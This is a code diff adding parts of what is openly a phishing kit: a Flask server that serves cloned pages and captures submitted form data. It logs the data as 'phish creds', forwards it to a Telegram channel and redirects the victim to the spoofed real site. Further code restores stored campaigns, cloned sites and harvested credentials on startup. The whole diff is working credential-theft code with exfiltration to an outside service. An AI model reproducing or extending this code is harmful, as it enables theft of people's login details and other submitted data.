+    if request.method == 'POST':
+        # Collect form data — flatten MultiDict, skip empty values
+        data = {k: v for k, v in request.form.items() if v}
+        # Also grab JSON body if sent that way (JS fetch payloads)
+        if not data and request.is_json:
+            data = request.get_json(silent=True) or {}
+        with deploy_lock:
+            deployed_pages[page_id]['hits'] += 1
+        _log_phish('[SUBMIT] page=' + page_id + ' ip=' + ip + ' data=' + str(data)[:300], 'warn')
+        # Forward to Telegram
+        def _fmt_page(d, pid, nm):
+            lines = ['<b>&#127919; SUBMIT</b>  <code>' + ip + '</code>',
+                     '<b>Page:</b> ' + nm + '  <code>' + pid + '</code>']
+            for k, v in d.items():
+                if v: lines.append('<b>' + k + ':</b> <code>' + str(v)[:200] + '</code>')
+            return '\n'.join(lines)
+        _tg_send(_fmt_page(data, page_id, page.get('name', page_id)))
+        # Log as phish cred so it appears in the LOGS tab
+        with phish_lock:
+            phish_creds.append({
+                'ts':       datetime.datetime.now().isoformat(),
+                'page_id':  page_id,
+                'page':     page.get('name', page_id),
+                'ip':       ip,
+                'ua':       ua,
+                'data':     data,
+            })
+        # Redirect to the real site being spoofed
+        redirect_to = page.get('redirect_url') or data.get('redirect') or 'https://google.com'
+        from flask import redirect as flask_redirect
+        return flask_redirect(redirect_to, 302)
+
+    # GET — serve the page
+    with deploy_lock:
+        deployed_pages[page_id]['hits'] += 1
+    _log_phish('[HIT] page=' + page_id + ' ip=' + ip + ' ua=' + ua[:80], 'info')
+    return page['html'], 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+def _restore_state():
+    """Restore persisted state on server startup."""
+    s = _load_state()
+    if not s:
+        return
+
+    if 'phish_creds' in s:
+        with phish_lock:
+            phish_creds.extend(s['phish_creds'])
+
+    if 'campaigns' in s:
+        with camp_lock:
+            campaigns.update(s['campaigns'])
+
+    if 'phish_tracking' in s:
+        with track_lock:
+            phish_tracking.update(s['phish_tracking'])
+
+    if 'cloned_sites' in s:
+        with clone_lock:
+            cloned_sites.update(s['cloned_sites'])
+
+    if 'deployed_pages' in s:
+        with deploy_lock:
+            deployed_pages.update(s['deployed_pages'])
+
+    if 'tg_config' in s:
+        with _tg_lock:
+            _tg_config.update(s['tg_config'])
+
+    print(f'[state] restored: {len(s.get("campaigns",{}))} campaigns, '
+          f'{len(s.get("phish_creds",[]))} creds, '
+          f'{len(s.get("deployed_pages",{}))} pages, '
+          f'tg={"on" if s.get("tg_config",{}).get("enabled") else "off"}')
+
 if __name__ == '__main__':
+    _restore_state()
     banner = r"""
   _  _    ___  _  _  _  _  ___  ___  _ __      _  _     _
  | || |  / _ \| || |_( )/ _|/ _ \| __|\ V /    | || |__ (_)_
